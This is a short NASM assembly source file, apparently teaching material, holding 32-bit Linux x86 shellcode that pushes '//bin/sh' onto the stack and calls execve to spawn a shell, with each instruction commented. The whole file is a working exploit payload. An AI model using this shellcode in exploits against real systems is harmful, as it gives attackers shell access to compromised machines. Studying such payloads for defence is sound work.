;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Filename: payload-execve-stack.nasm
; Author: Andrey Arapov <arno@nixaid.com>
; 2013 March

global _start


section .text

_start:
	; EAX
	xor eax, eax
        mov al, 11              ; execve syscall

        ; EBX
        xor edx, edx
	push edx                ; NULL termination of '//bin/sh' string
        push 0x68732f6e         ; '//bin/sh' in reverse
        push 0x69622f2f         ; beginning of '//bin/sh' string is here
        mov ebx, esp            ; put the address of '//bin/sh' into ebx via esp

	; ECX
        push edx                ; NULL termination of a stack
        push ebx                ; load our '//bin/sh' on a stack
        mov ecx, esp            ; ECX is a PTR to stack where we've got EBX address to '//bin/sh' string.

        ; EDX
        push edx                ; NULL terminator
        mov edx, esp            ; EDX is a PTR to a stack which has an address to NULL.
        int 0x80

